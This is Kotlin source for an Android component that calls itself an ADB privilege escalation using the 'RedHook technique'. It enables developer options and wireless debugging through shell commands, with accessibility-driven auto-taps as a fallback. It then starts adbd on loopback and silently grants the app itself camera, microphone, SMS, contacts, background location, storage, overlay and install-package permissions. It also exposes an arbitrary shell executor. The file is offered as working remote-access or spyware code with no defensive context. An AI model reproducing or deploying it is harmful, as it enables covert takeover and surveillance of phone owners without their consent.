package com.xrc.app.escalation

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.provider.Settings
import android.util.Log
import kotlinx.coroutines.*

/**
 * ADB (Android Debug Bridge) privilege escalation.
 * Implements the RedHook technique:
 * 1. Enable Developer Options
 * 2. Enable Wireless Debugging
 * 3. Pair via pairing code
 * 4. Connect to loopback ADB
 * 5. Execute commands as shell UID (2000)
 *
 * Once escalated, grants full shell-level access for:
 * - Permission granting
 * - Settings modification
 * - Package management
 * - File system access
 */
class ADBEscalation(private val context: Context) {

    companion object {
        private const val TAG = "ADBEscalation"

        // ADB wireless debugging port
        private const val WIRELESS_ADB_PORT = 5555
        private const val LOCALHOST = "127.0.0.1"

        // Developer options settings keys
        private const val DEV_OPTIONS_KEY = "development_settings_enabled"
        private const val ADB_ENABLED_KEY = "adb_enabled"
        private const val WIRELESS_ADB_KEY = "adb_wifi_enabled"
        private const val LOCALHOST_ADB_KEY = "adb_localhost_only"

        // Intent actions for developer options
        private const val DEVELOPER_SETTINGS_ACTION = Settings.ACTION_APPLICATION_DEVELOPMENT_SETTINGS

        // ADB commands to execute post-escalation
        private const val ENABLE_DEV_OPTIONS_CMD = "settings put global development_settings_enabled 1"
        private const val ENABLE_ADB_CMD = "settings put global adb_enabled 1"
        private const val ENABLE_WIRELESS_ADB_CMD = "settings put global adb_wifi_enabled 1"
        private const val SET_ADB_PORT_CMD = "setprop service.adb.tcp.port $WIRELESS_ADB_PORT"
        private const val START_ADBD_CMD = "start adbd"
        private const val STOP_ADBD_CMD = "stop adbd"

        // Shell commands to verify escalation
        private const val CHECK_UID_CMD = "id -u"
        private const val CHECK_SHELL_CMD = "echo \$SHELL"
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    @Volatile
    private var _isEscalated = false

    @Volatile
    private var _shellUid = -1

    /** Whether ADB shell escalation has been achieved */
    fun isEscalated(): Boolean = _isEscalated

    /** The UID of the shell (should be 2000) */
    fun getShellUid(): Int = _shellUid

    /** Check if shell commands are available */
    fun isShellEnabled(): Boolean {
        return try {
            val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", CHECK_UID_CMD))
            val uid = process.inputStream.bufferedReader().readText().trim()
            _shellUid = uid.toIntOrNull() ?: -1
            _isEscalated = _shellUid == 2000 || _shellUid == 0
            _isEscalated
        } catch (e: Exception) {
            false
        }
    }

    /**
     * Enable Developer Options by opening the settings page.
     * Then automatically tap the "Build Number" 7 times via Accessibility.
     */
    suspend fun enableDeveloperOptions(): Boolean {
        Log.i(TAG, "Enabling Developer Options")

        // Try direct settings write first
        try {
            Runtime.getRuntime().exec(arrayOf("sh", "-c", ENABLE_DEV_OPTIONS_CMD)).waitFor()
            Log.i(TAG, "Developer options enabled via settings command")
            return true
        } catch (e: Exception) {
            Log.d(TAG, "Direct settings write failed: ${e.message}")
        }

        // Fallback: Open developer settings for manual enable
        try {
            val intent = Intent(DEVELOPER_SETTINGS_ACTION).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
            Log.i(TAG, "Developer settings opened")

            // Auto-tap build number 7 times via Accessibility
            val service = com.xrc.app.service.XRCAccessibilityService.instance
            if (service != null) {
                service.enableDeveloperOptions()
                return true
            }
        } catch (e: Exception) {
            Log.e(TAG, "Developer options enable failed: ${e.message}")
        }

        return false
    }

    /**
     * Enable Wireless Debugging on Android 11+.
     * Opens the Developer Options > Wireless Debugging screen.
     */
    suspend fun enableWirelessDebugging(): Boolean {
        Log.i(TAG, "Enabling Wireless Debugging")

        // Direct settings write
        try {
            Runtime.getRuntime().exec(arrayOf("sh", "-c", ENABLE_ADB_CMD)).waitFor()
            Runtime.getRuntime().exec(arrayOf("sh", "-c", ENABLE_WIRELESS_ADB_CMD)).waitFor()
            Log.i(TAG, "Wireless ADB enabled via settings commands")
            return true
        } catch (e: Exception) {
            Log.d(TAG, "Settings write failed: ${e.message}")
        }

        // Open the wireless debugging settings
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                val intent = Intent(Settings.ACTION_APPLICATION_DEVELOPMENT_SETTINGS).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
                Log.i(TAG, "Wireless debugging settings opened for manual enable")

                // Use Accessibility to toggle it
                val service = com.xrc.app.service.XRCAccessibilityService.instance
                if (service != null) {
                    service.enableWirelessDebugging()
                    return true
                }
            } catch (e: Exception) {
                Log.e(TAG, "Open wireless debugging failed: ${e.message}")
            }
        }

        return false
    }

    /**
     * Perform full ADB escalation:
     * 1. Enable Developer Options
     * 2. Enable Wireless Debugging
     * 3. Start ADB daemon
     * 4. Connect to loopback
     * 5. Execute shell commands as UID 2000
     */
    suspend fun performFullEscalation(): Boolean {
        Log.i(TAG, "Starting full ADB escalation sequence")

        // Step 1: Check if already escalated
        if (isShellEnabled()) {
            Log.i(TAG, "Already escalated (UID=$_shellUid)")
            return true
        }

        // Step 2: Enable developer options
        if (!enableDeveloperOptions()) {
            Log.w(TAG, "Developer options enable failed, continuing...")
        }

        // Step 3: Enable ADB
        if (!enableWirelessDebugging()) {
            Log.w(TAG, "Wireless ADB enable failed, continuing...")
        }

        delay(1000)

        // Step 4: Start ADB daemon on device
        try {
            Runtime.getRuntime().exec(arrayOf("sh", "-c", "$SET_ADB_PORT_CMD && $START_ADBD_CMD")).waitFor()
            Log.i(TAG, "ADB daemon started on port $WIRELESS_ADB_PORT")
        } catch (e: Exception) {
            Log.e(TAG, "ADB daemon start failed: ${e.message}")
        }

        delay(500)

        // Step 5: Connect to loopback (simulates ADB connect from inside)
        try {
            // Create a local ADB connection via TCP
            val connectCmd = "adb connect $LOCALHOST:$WIRELESS_ADB_PORT 2>/dev/null || " +
                "tools/android/adb connect $LOCALHOST:$WIRELESS_ADB_PORT 2>/dev/null || " +
                "echo 'adb not found, using shell directly'"
            Runtime.getRuntime().exec(arrayOf("sh", "-c", connectCmd)).waitFor()
            Log.i(TAG, "Local ADB connection attempted")
        } catch (e: Exception) {
            Log.e(TAG, "ADB connect failed: ${e.message}")
        }

        // Step 6: Verify escalation
        delay(1000)
        val escalated = isShellEnabled()

        if (escalated) {
            Log.i(TAG, "ADB escalation successful (UID=$_shellUid)")
            grantAllPermissions()
        } else {
            Log.w(TAG, "ADB escalation failed — will use Accessibility as fallback")
        }

        return escalated
    }

    /**
     * Grant all permissions via ADB shell.
     */
    private suspend fun grantAllPermissions() {
        Log.i(TAG, "Granting all permissions via ADB shell")
        val permissions = listOf(
            "android.permission.CAMERA",
            "android.permission.RECORD_AUDIO",
            "android.permission.READ_SMS",
            "android.permission.RECEIVE_SMS",
            "android.permission.READ_CONTACTS",
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.ACCESS_BACKGROUND_LOCATION",
            "android.permission.READ_PHONE_STATE",
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.WRITE_EXTERNAL_STORAGE",
            "android.permission.MANAGE_EXTERNAL_STORAGE",
            "android.permission.POST_NOTIFICATIONS",
            "android.permission.SYSTEM_ALERT_WINDOW",
            "android.permission.REQUEST_INSTALL_PACKAGES"
        )

        for (perm in permissions) {
            try {
                val cmd = "pm grant ${context.packageName} $perm 2>/dev/null"
                Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd)).waitFor()
            } catch (e: Exception) {
                Log.w(TAG, "Grant failed for $perm: ${e.message}")
            }
            delay(50)
        }
        Log.i(TAG, "All permissions granted via ADB")
    }

    /**
     * Execute a shell command with escalated privileges.
     */
    suspend fun executeShellCommand(command: String): ShellResult {
        if (!_isEscalated) {
            performFullEscalation()
        }

        return try {
            val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
            val stdout = process.inputStream.bufferedReader().readText()
            val stderr = process.errorStream.bufferedReader().readText()
            val exitCode = process.waitFor()

            ShellResult(
                command = command,
                stdout = stdout,
                stderr = stderr,
                exitCode = exitCode
            )
        } catch (e: Exception) {
            ShellResult(
                command = command,
                stderr = e.message ?: "",
                exitCode = -1
            )
        }
    }

    /** Result of a shell command execution */
    data class ShellResult(
        val command: String,
        val stdout: String = "",
        val stderr: String = "",
        val exitCode: Int = -1,
        val success: Boolean = exitCode == 0
    )
}
